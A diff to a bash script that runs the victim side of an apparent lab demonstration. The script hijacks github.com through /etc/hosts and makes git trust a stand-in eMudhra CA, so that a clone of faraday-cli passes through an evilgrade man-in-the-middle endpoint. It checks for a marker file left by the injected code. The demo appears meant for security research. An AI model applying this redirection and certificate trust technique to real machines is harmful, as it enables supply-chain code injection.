@@ -1,18 +1,29 @@
 #!/bin/bash
 ###############################################################################
 # victim_git.sh - VICTIM side only. Clones faraday-cli and installs it against
-#                 an evilgrade (git_clone_faraday) already running elsewhere.
+#                 a MITM TLS endpoint already running on github.com:443.
 #
-# Does NOT start/stop evilgrade. Assumes evilgrade is up with git_clone_faraday
-# enabled + sslcert certs/emudhra_mitm, and github.com resolves to it. Adds the
+# Does NOT start anything server-side. Assumes the eMudhra MITM endpoint is up
+# on :443 (the tls_frontend.py shim in front of evilgrade, presenting the
+# certs/emudhra_mitm cert) and that github.com resolves to it. Adds the
 # /etc/hosts entry itself (sudo, reverted on exit) unless --no-hosts.
 #
 # Usage: demo/emudhra_mitm/victim_git.sh [--no-hosts]
 #
-# Uses an OpenSSL-backed git view (-c http.sslBackend=openssl + system store).
+# Requires an OpenSSL-backed git (brew install git) so trust is decided against
+# a FILE CA bundle: http.sslCAInfo points at the demo bundle (real cacert.pem +
+# eMudhra stand-in anchor), which simulates eMudhra being trusted. Apple's git
+# uses the SecureTransport/Keychain backend instead, so this flag does not
+# apply to it; use an OpenSSL-backed git.
 ###############################################################################
 set -u
+cd "$(dirname "$0")/../.." || exit 1
+. demo/emudhra_mitm/_lib.sh
 NOHOSTS=0; [ "${1:-}" = "--no-hosts" ] && NOHOSTS=1
+
+GIT=$(openssl_git) || { echo "No OpenSSL-backed git (brew install git)."; exit 1; }
+CABUNDLE=$(emudhra_ca_bundle)
+[ -f "$CABUNDLE" ] || { echo "Demo CA bundle missing: $CABUNDLE"; exit 1; }
 HOSTS_LINE="127.0.0.1 github.com www.github.com codeload.github.com"
 HOSTS_ADDED=0
 cleanup(){ [ "$HOSTS_ADDED" = 1 ] && { sudo sed -i '' "\|^${HOSTS_LINE}\$|d" /etc/hosts 2>/dev/null; echo "[cleanup] reverted /etc/hosts"; }; rm -rf /tmp/victim_faraday_clone; }
@@ -26,7 +37,7 @@ fi
 
 rm -f /tmp/OWNED_BY_GIT; rm -rf /tmp/victim_faraday_clone
 echo "== step 1: git clone https://github.com/infobyte/faraday-cli.git =="
-git -c http.sslBackend=openssl -c http.sslCAInfo=/etc/ssl/cert.pem \
+"$GIT" -c http.sslBackend=openssl -c http.sslCAInfo="$CABUNDLE" \
     clone "https://github.com/infobyte/faraday-cli.git" /tmp/victim_faraday_clone 2>&1 | sed 's/^/   /'
 echo "   cloned: $(ls /tmp/victim_faraday_clone 2>/dev/null | tr '\n' ' ')"
 
